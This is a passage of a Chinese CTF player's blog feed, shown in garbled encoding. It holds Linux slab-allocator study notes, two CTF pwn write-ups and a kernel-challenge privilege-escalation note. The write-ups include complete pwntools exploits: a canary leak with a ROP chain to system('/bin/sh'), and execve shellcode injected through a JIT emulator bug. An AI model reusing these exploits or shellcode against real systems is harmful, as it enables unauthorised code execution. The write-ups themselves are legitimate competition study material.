void*addr)</p><p>è¿™ä¸ªå‡½æ•°å¯ä»¥ç¡çœ ï¼Œæ²¡æœ‰è¿”å›å€¼</p><h2 id="6-slabå±‚"><a href="#6-slabå±‚" class="headerlink" title="6.slabå±‚"></a>6.slabå±‚</h2><p>ç©ºé—²é“¾è¡¨ï¼šç›¸å½“äºå¯¹è±¡é«˜é€Ÿç¼“å­˜</p><p>slabæ‰®æ¼”é€šç”¨æ•°æ®ç»“æ„ç¼“å­˜å±‚çš„è§’è‰²</p><h3 id="è®¾è®¡æ€æƒ³"><a href="#è®¾è®¡æ€æƒ³" class="headerlink" title="è®¾è®¡æ€æƒ³"></a>è®¾è®¡æ€æƒ³</h3><p>ä¸åŒçš„å¯¹è±¡åˆ’åˆ†ä¸ºé«˜é€Ÿç¼“å­˜ç»„ï¼Œæ¯ç§å¯¹è±¡å¯¹åº”ä¸€ä¸ªé«˜é€Ÿç¼“å­˜</p><p>kmallocå»ºç«‹åœ¨slabå±‚ä¸Šï¼Œä½¿ç”¨ä¸€ç»„cache</p><p>slabï¼šä¸€ä¸ªå¤šä¸ªç‰©ç†ä¸Šè¿ç»­çš„é¡µç»„æˆï¼Œä¸€èˆ¬æƒ…å†µä¸‹ä»…ä»…ä¸€é¡µ</p><p>æŠŠç”¨çš„ï¼Œä¸ç”¨çš„å¯¹è±¡ç»„ç»‡èµ·æ¥</p><p>ä¾‹å­ï¼šinodeç”¨slabç®¡ç†, struct inodeç”¨inode_cachepé«˜é€Ÿç¼“å­˜</p><p>æ¯ä¸ªé«˜é€Ÿç¼“å­˜ç”¨kmem_cacheç»“æ„è¡¨ç¤ºï¼ŒåŒ…å«ä¸‰ä¸ªé“¾è¡¨ï¼šslabs_full,partial,empty</p><p>æ¯ä¸ªslabç”¨slabæè¿°ç¬¦ struct slabè¡¨ç¤º</p><pre><code>struct slab &#123;    struct list_head list;    unsigned long colouroff; //ç€è‰²çš„åç§»é‡    void *s_mem; //ç¬¬ä¸€ä¸ªå¯¹è±¡    unsigned inuse; //å·²åˆ†é…çš„å¯¹è±¡    kmem_bufctl_t free; //ç¬¬ä¸€ä¸ªç©ºé—²å¯¹è±¡&#125;;</code></pre><p>slabæè¿°ç¬¦ï¼šè¦ä¹ˆåœ¨slabå¤–å¦è¡Œåˆ†é…ï¼Œè¦ä¹ˆåœ¨slabè‡ªèº«å¼€å§‹çš„åœ°æ–¹ã€‚</p><p>slabä¸ºé«˜é€Ÿç¼“å­˜åˆ›å»ºæ–°çš„slabï¼Œé€šè¿‡__get_free_pages()</p><pre><code>void *kmem_getpages(struct kmem_cahce *cachep, gfp_t flags, int nodeid)</code></pre><p>nodeid:ç”¨äºNUMAç³»ç»Ÿï¼Œæä¾›è¾ƒå¥½æ€§èƒ½</p><p>è¿”å›ä¸€ä¸ªslabå¤§å°çš„ç©ºé¡µ</p><p>slabå±‚çš„ç®¡ç†ï¼šåœ¨æ¯ä¸ªé«˜é€Ÿç¼“å­˜çš„åŸºç¡€ä¸Šï¼Œç»™æ•´ä¸ªå†…æ ¸ä¸€ä¸ªç®€å•çš„æ¥å£å®Œæˆ</p><p>é€šè¿‡æ¥å£ï¼Œåˆ›å»ºæ’¤é”€æ–°çš„é«˜é€Ÿç¼“å­˜</p><h3 id="slabåˆ†é…å™¨çš„æ¥å£"><a href="#slabåˆ†é…å™¨çš„æ¥å£" class="headerlink" title="slabåˆ†é…å™¨çš„æ¥å£"></a>slabåˆ†é…å™¨çš„æ¥å£</h3><p>é«˜é€Ÿç¼“å­˜çš„åˆ›å»º</p><pre><code>struct kmem_cache * kmem_cache_create(const char *name, size_t size, size_t align, unsigned long flags, void (*ctor) (void*));</code></pre><p>flags:</p><ul><li>SLAB_HWCACHE_ALIGN:æ‰€æœ‰å¯¹è±¡ï¼Œè¡Œå¯¹é½ï¼Œé˜²æ­¢é”™è¯¯çš„å…±äº«</li><li>SLAB_POISON:ç”¨a5a5a5a5å¡«å……slab</li><li>SLAB_RED_ZONEï¼šçº¢è‰²è­¦æˆ’åŒºï¼Œæ£€æµ‹ç¼“å†²è¶Šç•Œ</li><li>SLAB_CACHE_DMAï¼šç”¨äºDMA</li></ul><p>ctor:æ„é€ å‡½æ•°ï¼Œlinuxä¸éœ€è¦</p><p>ä¸èƒ½åœ¨ä¸­æ–­contextä¸­ä½¿ç”¨-&gt;å¯èƒ½ç¡çœ </p><p>é«˜é€Ÿç¼“å­˜çš„æ’¤é”€</p><pre><code>int kmem_cache_destroy(struct kmem_cache *cachep)</code></pre><p>è°ƒç”¨æ¡ä»¶ï¼š</p><ul><li><p>æ‰€æœ‰slabä¸ºç©ºï¼Œä¸èƒ½è¢«åˆ†é…</p></li><li><p>è°ƒç”¨destroyè¿‡ç¨‹ä¸­ä¸å†è®¿é—®è¿™ä¸ªé«˜é€Ÿç¼“å­˜</p></li></ul><h3 id="1-ä»ç¼“å­˜ä¸­åˆ†é…"><a href="#1-ä»ç¼“å­˜ä¸­åˆ†é…" class="headerlink" title="1.ä»ç¼“å­˜ä¸­åˆ†é…"></a>1.ä»ç¼“å­˜ä¸­åˆ†é…</h3><p>åˆ›å»ºcachepåå¯ä»ä¸‹é¢å‡½æ•°è·å–å¯¹è±¡ï¼š</p><pre><code>void * kmem_cache_alloc(struct kmem_cache *cachep, gfp_t flags)</code></pre><p>ä»æŒ‡å®šçš„cachepè·å¾—ä¸€ä¸ªæŒ‡å‘å¯¹è±¡çš„æŒ‡é’ˆ</p><p>flags:é’ˆå¯¹cachepæ²¡æœ‰ç©ºé—²å¯¹è±¡æ—¶ï¼Œ getpagesçš„æƒ…å†µ</p><p>é‡Šæ”¾å¯¹è±¡</p><pre><code>void * kmem_cache_free(struct kmem_cache *cachep, void *objp)</code></pre><h3 id="2-task-structä½¿ç”¨å®ä¾‹"><a href="#2-task-structä½¿ç”¨å®ä¾‹" class="headerlink" title="2.task_structä½¿ç”¨å®ä¾‹"></a>2.task_structä½¿ç”¨å®ä¾‹</h3>]]></content>
      
      
      
        <tags>
            
            <tag> study notes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023é“äººä¸‰é¡¹å†³èµ›</title>
      <link href="/2023/04/28/2023%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E5%86%B3%E8%B5%9B/"/>
      <url>/2023/04/28/2023%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E5%86%B3%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<p>é“ä¸‰å†³èµ›pwnçš„éš¾åº¦ä¸å¤§ï¼Œä½†æ˜¯é‚£é“è™šæ‹Ÿæœºæ¼æ´ç±»å‹è¿˜æ˜¯æŒºæ–°é¢–çš„ï¼Œä»¥åæœ‰ç©ºå¯ä»¥æ•´ç†ä¸€ä¸‹ä¸åŒç±»å‹è™šæ‹Ÿæœºæ¼æ´çš„åˆ©ç”¨</p><p>å€¼å¾—åæ§½çš„æ˜¯ï¼Œæˆ‘ä»¬å®è®­è¯¾xjbè£…ä¸œè¥¿ï¼Œç«Ÿç„¶æŠŠæˆ‘kaliçš„pwntoolså’Œpwndbgå…¨ææ²¡äº†ï¼Œæ¯”èµ›å‰åŠå°æ—¶æ‰å‘ç°ï¼ˆåˆ«é—®æˆ‘ä¸ºä»€ä¹ˆè¿™ä¹ˆä¹…æ²¡ç¢°pwn)ï¼Œå®³å¾—æˆ‘æŠŠkaliæ¢å¤åˆ°äº†å»å¹´8æœˆçš„å¿«ç…§</p><h1 id="driverlicense"><a href="#driverlicense" class="headerlink" title="driverlicense"></a>driverlicense</h1><h3 id="é¢˜ç›®å¤ç°"><a href="#é¢˜ç›®å¤ç°" class="headerlink" title="é¢˜ç›®å¤ç°"></a>é¢˜ç›®å¤ç°</h3><p>å¯ä»¥è¾“å…¥é©¾ç…§çš„name, year, comment, nameå’Œcommentä»¥stringå½¢å¼å­˜åœ¨æ ˆä¸Šï¼Œyearä¸ºæ•°å­—</p><p>åé¢å¯ä»¥ä¿®æ”¹commentï¼Œå¹¶showé©¾ç…§çš„ä¿¡æ¯</p><h3 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h3><p>edit commentçš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬ä¼šè·å¾—comment stringçš„cstræŒ‡é’ˆï¼Œç„¶åç”¨malloc_usable_sizeçš„æ–¹å¼è·å¾—å½“å‰é•¿åº¦ï¼Œè¿™ä¸ªé•¿åº¦ç”¨äºåç»­çš„è¾“å‡º</p><p>ä½†æ˜¯cstråœ¨å­—ç¬¦ä¸²é•¿çš„æ—¶å€™æ‰æ˜¯å †æŒ‡é’ˆï¼Œ<strong>å­—ç¬¦ä¸²è¾ƒçŸ­çš„æ—¶å€™ä¼šä¿å­˜åœ¨æ ˆä¸Šï¼Œæ­¤æ—¶malloc_usable_sizeä¸é€‚ç”¨è¿™ç§æƒ…å†µ</strong>ï¼Œæˆ‘ä»¬å¯ä»¥è·å¾—ä¸€ä¸ªå¾ˆå¤§çš„size</p><p><img src="1.png" alt="get usable size"></p><p>ç”±äºæ­¤æ—¶å­—ç¬¦ä¸²åœ¨æ ˆä¸Šï¼Œæˆ‘ä»¬åˆæ­¥æ„æ€è¿™æ˜¯ä¸€ä¸ªæ ˆæº¢å‡º</p><p>æ¥ä¸‹æ¥é—®é¢˜æ¥äº†ï¼Œæ€ä¹ˆæ³„éœ²libcå’Œcanary?</p><p>å‡ºé¢˜è€…æ•…æ„æŠŠname stringæ”¾åœ¨äº†comment stringåï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡æº¢å‡ºæ§åˆ¶nameçš„cstr,ç”±äºæ²¡å¼€pieï¼Œæˆ‘ä»¬ç›´æ¥æŠŠcstræ¢æˆreadçš„gotåœ°å€ï¼Œå°±æ³„éœ²äº†libc</p><p>å¦‚æ³•ç‚®åˆ¶ï¼Œæœ‰äº†libcå°±æœ‰äº†envrionï¼Œå°±å¯ä»¥é€šè¿‡åç§»æ¨æµ‹æ ˆä¸Šçš„canaryåœ°å€ï¼Œæ³„éœ²å‡ºæ¥</p><h3 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token keyword">def</span> <span class="token function">lg</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span>addr<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\033[1;31;40m%20s-->0x%x\033[0m'</span><span class="token operator">%</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#io = process('./pwn')</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'172.31.3.108'</span><span class="token punctuation">,</span> <span class="token number">10001</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.23.so'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'comment'</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'year'</span><span class="token punctuation">,</span> <span class="token string">'12'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'comment'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token operator">*</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(io, 'b *0x401137')</span>payload <span class="token operator">=</span> b<span class="token string">'b'</span><span class="token operator">*</span><span class="token number">8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x40155d</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x602028</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'name : '</span><span class="token punctuation">)</span>leak_libc <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token operator">+</span> b<span class="token string">'\0\0'</span><span class="token punctuation">)</span>lg<span class="token punctuation">(</span><span class="token string">'leak_libc'</span><span class="token punctuation">,</span> leak_libc<span class="token punctuation">)</span>libc_base <span class="token operator">=</span> leak_libc <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true">#leak stack </span>environ <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'environ'</span><span class="token punctuation">]</span>payload <span class="token operator">=</span> b<span class="token string">'b'</span><span class="token operator">*</span><span class="token number">8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x40155d</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>environ<span class="token punctuation">)</span>edit<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'name : '</span><span class="token punctuation">)</span>leak_stack <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token operator">+</span> b<span class="token string">'\0\0'</span><span class="token punctuation">)</span>lg<span class="token punctuation">(</span><span class="token string">'leak_stack'</span><span class="token punctuation">,</span> leak_stack<span class="token punctuation">)</span>stack_addr <span class="token operator">=</span> leak_stack <span class="token operator">+</span> <span class="token number">0x7fffaca833c8</span> <span class="token operator">-</span> <span class="token number">0x7fffaca834d8</span><span class="token comment" spellcheck="true">#leak canary</span>payload <span class="token operator">=</span> b<span class="token string">'b'</span><span class="token operator">*</span><span class="token number">8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x40155d</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>stack_addr<span class="token punctuation">)</span>edit<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'name : '</span><span class="token punctuation">)</span>canary <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg<span class="token punctuation">(</span><span class="token string">'canary'</span><span class="token punctuation">,</span> canary<span class="token punctuation">)</span>payload <span class="token operator">=</span> b<span class="token string">'b'</span><span class="token operator">*</span><span class="token number">8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x40155d</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">,</span> b<span class="token string">'b'</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x401713</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span>b<span class="token string">'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__next__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(io, 'b *0x401416')</span><span class="token comment" spellcheck="true">#gdb.attach(io, 'b *0x40149d')</span>edit<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(io)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h3 id="è¡¥å……"><a href="#è¡¥å……" class="headerlink" title="è¡¥å……"></a>è¡¥å……</h3><p>è¿™é¢˜å’Œå—é˜³ç†å·¥çš„å¸ˆå‚…äº¤æµçš„è¿‡ç¨‹ä¸­ï¼Œå‘ç°ä»–ä»¬å› ä¸ºæ‰¾ä¸åˆ°2.23å¯¹åº”çš„c++åº“ï¼Œæ”¾å¼ƒäº†è°ƒè¯•ã€‚å¦‚wpæ‰€ç¤ºï¼Œæˆ‘è°ƒè¯•çš„è¿‡ç¨‹ä¸­ï¼Œæ˜¯ç›´æ¥å…ˆç”¨è‡ªå·±è™šæ‹Ÿæœºçš„libcåº“æ€¼æˆåŠŸäº†ï¼Œç„¶åç›´æ¥æ”¹ç”¨ç»™çš„2.23åç§»æ‰“è¿œç¨‹ã€‚è¿™æ ·æš´åŠ›çš„æ–¹æ³•æœ‰ä¸€ä¸ªé—®é¢˜ï¼šå°±æ˜¯ä¸åŒlibcåº“ä¼šå¯¼è‡´environæ ˆåœ°å€å’Œcanaryçš„åç§»ä¸åŒï¼ˆstack_addr = leak_stack + 0x7fffaca833c8 - 0x7fffaca834d8è¿™å¥ï¼‰ï¼Œå¥½åœ¨æˆ‘è¿œç¨‹çš„è¿‡ç¨‹ä¸­è¯•äº†å‡ æ¬¡å°±æ‰¾åˆ°äº†2.23ä¸‹çš„canaryåç§»ï¼Œæ¯”è¾ƒå¹¸è¿</p><p>å½“ç„¶ï¼Œæ—¶é—´å……è¶³çš„æƒ…å†µä¸‹ï¼Œè‚¯å®šæ˜¯èƒ½æ‰¾åˆ°æ‰€æœ‰å¯¹åº”åº“æœ¬åœ°è°ƒè¯•ï¼Œæœ€ä¸¥è°¨ã€‚</p><h1 id="fast-emulator"><a href="#fast-emulator" class="headerlink" title="fast_emulator"></a>fast_emulator</h1><h3 id="é¢˜ç›®å¤ç°-1"><a href="#é¢˜ç›®å¤ç°-1" class="headerlink" title="é¢˜ç›®å¤ç°"></a>é¢˜ç›®å¤ç°</h3><p>ç¨‹åºå®ç°äº†ä¸€ä¸ªèƒ½å®ç°load,add,sub,mul,div,xoræŒ‡ä»¤çš„å³æ—¶ç¼–è¯‘å™¨ï¼Œç”¨æˆ·é€è¡Œè¾“å…¥æŒ‡ä»¤ï¼Œ parse_lineä¼šæŠŠæŒ‡ä»¤åˆ†æä¸ºargsç»“æ„ä½“ï¼Œç„¶åargsç»“æ„ä½“ä¼šè¢«ç¿»è¯‘ä¸ºshellcodeï¼Œå…¨éƒ¨è¾“å…¥åæ‰§è¡Œshellcode</p><p><img src="2.png" alt="main process"></p><h3 id="æ¼æ´åˆ†æ-1"><a href="#æ¼æ´åˆ†æ-1" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h3><p>è¯´è¯´æˆ‘è§£é¢˜æ—¶çš„è¿‡ç¨‹ï¼ˆåŸºæœ¬æ˜¯åºŸè¯ï¼‰</p><p>æˆ‘å…ˆæŠŠæ‰€æœ‰æŒ‡ä»¤è¯•äº†ä¸€éï¼Œç„¶ååŠ¨è°ƒå‘ç°divæŒ‡ä»¤å®é™…çš„shellcodeæ˜¯loopneï¼Œæˆ‘å°±è€ƒè™‘ç”¨loopneç›´æ¥è·³è½¬åˆ°loadçš„æ•°æ®é€ æˆæ¶æ„æ‰§è¡Œã€‚æ¯”å¦‚æœ‰ä¸€å¥â€™load r1, 0x12345678â€™ï¼Œç›´æ¥è·³è½¬åˆ°\x12\x34\x56\x78çš„åœ°æ–¹</p><p>ç„¶åæˆ‘æƒ³è®©è·³è½¬æ‰§è¡Œçš„å‘½ä»¤æ›´é•¿ï¼Œå°±è¯•äº†ä¸€ä¸‹â€™load r1,0x1111111111â€™,ç„¶ååŠ¨è°ƒå‘ç°ï¼Œshellcodeå®é™…è¢«ç¿»è¯‘ä¸ºâ€™mov rax, 0x11111111â€™å†åŠ ä¸Š\x11\x11</p><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œ<strong>è¿™ä¸ªmov rax,(num)æœ€å¤šåªèƒ½æ”¯æŒ32ä½æ•°ï¼Œä½†è§£æçš„è¿‡ç¨‹ä¸­å¯ä»¥æ‹¼æ¥è¶…è¿‡32ä½çš„æ•°ï¼Œè¶…è¿‡çš„éƒ¨åˆ†ä¼šå˜æˆä¸‹ä¸€è¡Œæ±‡ç¼–æ‰§è¡Œ</strong></p><p>å†é™æ€åˆ†æï¼Œæ­£æ˜¯è¿™ä¸ªfrom_hexå‡½æ•°æ²¡æœ‰é™åˆ¶16è¿›åˆ¶æ•°çš„å¤§å°</p><p><img src="3.png" alt="from_hex"></p><p>è¿™æ ·æˆ‘ä»¬ç›¸å½“äºå¯ä»¥ç›´æ¥ç”¨è¿™ä¸ªæ¼æ´ä»»æ„æ‰§è¡Œäº†ï¼Œä½†è¿˜è¦æ³¨æ„ï¼Œæˆ‘ä»¬è¾“å…¥çš„æ¯è¡ŒæŒ‡ä»¤æœ‰é•¿åº¦é™åˆ¶ï¼Œå› æ­¤ç½‘ä¸Šæ‰’çš„shellcodeå¾—åˆ†æ®µ</p><p>å…·ä½“å¤§å°ç«¯ä¹‹ç±»çš„éº»çƒ¦é—®é¢˜ç›´æ¥çœ‹æˆ‘wp</p><h3 id="wp-1"><a href="#wp-1" class="headerlink" title="wp"></a>wp</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token keyword">def</span> <span class="token function">lg</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span>addr<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\033[1;31;40m%20s-->0x%x\033[0m'</span><span class="token operator">%</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#io = process('./pwn')</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'172.31.3.108'</span><span class="token punctuation">,</span> <span class="token number">10000</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(io, 'b*$rebase(0x1a16)')</span><span class="token comment" spellcheck="true">#gdb.attach(io, 'b*$rebase(0x16d5)')</span>payload <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>shellcode <span class="token operator">=</span> <span class="token string">'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'</span>payload<span class="token punctuation">.</span>append<span class="token punctuation">(</span>b<span class="token string">'load r2, 0x'</span> <span class="token operator">+</span> b<span class="token string">'f63148'</span> <span class="token operator">+</span> b<span class="token string">'0'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>payload<span class="token punctuation">.</span>append<span class="token punctuation">(</span>b<span class="token string">'load r2, 0x'</span> <span class="token operator">+</span> b<span class="token string">'68732f2f6e69622fbf4856'</span> <span class="token operator">+</span> b<span class="token string">'0'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>payload<span class="token punctuation">.</span>append<span class="token punctuation">(</span>b<span class="token string">'load r2, 0x'</span> <span class="token operator">+</span> b<span class="token string">'5f5457'</span> <span class="token operator">+</span> b<span class="token string">'0'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>payload<span class="token punctuation">.</span>append<span class="token punctuation">(</span>b<span class="token string">'load r2, 0x'</span> <span class="token operator">+</span> b<span class="token string">'050f99583b6a'</span> <span class="token operator">+</span> b<span class="token string">'0'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>length <span class="token operator">=</span> len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'enter:'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>gameéé¢„æœŸ</title>
      <link href="/2022/12/16/game%E9%9D%9E%E9%A2%84%E6%9C%9F/"/>
      <url>/2022/12/16/game%E9%9D%9E%E9%A2%84%E6%9C%9F/</url>
      
        <content type="html"><![CDATA[<p>è¿™æ¬¡gameç›¯äº†å¥½ä¹…ï¼Œç»“æœå¤§å®¶éƒ½æ˜¯éé¢„æœŸã€‚ç‰¹æ­¤æ¥å­¦ä¹ ä¸€ä¸‹</p><p>æˆ‘ä»¬çš„å†…æ ¸é¢˜å¤§æ¦‚æ˜¯å…ˆåœ¨start.shä¸­å¯åŠ¨qemuï¼Œç„¶åå¯ç”¨æ–‡ä»¶ç³»ç»Ÿé‡Œçš„initè„šæœ¬</p><p><img src="1.png" alt="è§£å‹åçš„æ–‡ä»¶ç³»ç»Ÿ"></p><p><img src="2.png" alt="initè„šæœ¬"></p><p>é‚£ä¹ˆé—®é¢˜å°±åœ¨ï¼Œå¦‚æœæˆ‘ä»¬åŸæœ¬çš„æ–‡ä»¶ç³»ç»Ÿä¸­binæ–‡ä»¶å¤¹æ²¡æœ‰è®¾ç½®rootä¸ºæ‰€æœ‰è€…ï¼Œè€Œä¸”initçš„è„šæœ¬ä¹Ÿæ²¡æœ‰è®¾ç½®ç›¸åº”çš„æƒé™å˜åŠ¨ï¼Œ<strong>æœ€ç»ˆé¢˜ç›®å‘ˆç°çš„ç»“æœå°±æ˜¯åšé¢˜è€…å¯¹binæ–‡ä»¶å¤¹æ‹¥æœ‰rwxæƒé™ï¼Œå¯ä»¥éšä¾¿å¢åˆ æŸ¥æ”¹binä¸­çš„æ‰€æœ‰å‘½ä»¤</strong></p><p>å†çœ‹æˆ‘ä»¬çš„initè„šæœ¬</p><p>ç”¨1000çš„uidï¼ˆå³chalç”¨æˆ·ï¼‰æ‰§è¡Œå®Œ/bin/shåï¼Œç”¨rootæƒé™è°ƒç”¨äº†umount,poweroffå‘½ä»¤ï¼Œå¦‚æœæˆ‘ä»¬æŠŠumount,poweroffä»»æ„ä¸€ä¸ªæ¢æˆ/bin/shï¼Œå¹¶ç»“æŸå½“å‰çš„/bin/shï¼Œå°±ç›¸å½“äºrootæƒé™æ‰§è¡Œäº†/bin/shå®ç°äº†ææƒ</p><p>ä¸çŸ¥é“poweroffæ›¿æ¢ä¸ºå•¥å¤±è´¥äº†ï¼Œè¿˜æ˜¯ç”¨å¤§å®¶éƒ½ç”¨çš„æ›¿æ¢umountè¯•éªŒä¸€ä¸‹</p><p><img src="3.png" alt="æ›¿æ¢umountææƒ"></p><p>è¦é¿å…è¿™ç§éé¢„æœŸå¾ˆç®€å•ï¼Œåœ¨initè„šæœ¬ä¸­chown bin sbinè¿™äº›æ–‡ä»¶å¤¹ç»™rootï¼Œæˆ–è€…ç›´æ¥è¾“å‘½ä»¤chownå®ƒä»¬å°±è¡Œäº†ï¼Œä¸å†èµ˜è¿°äº†</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> study </tag>
            
        </tags>
      
    </entry>
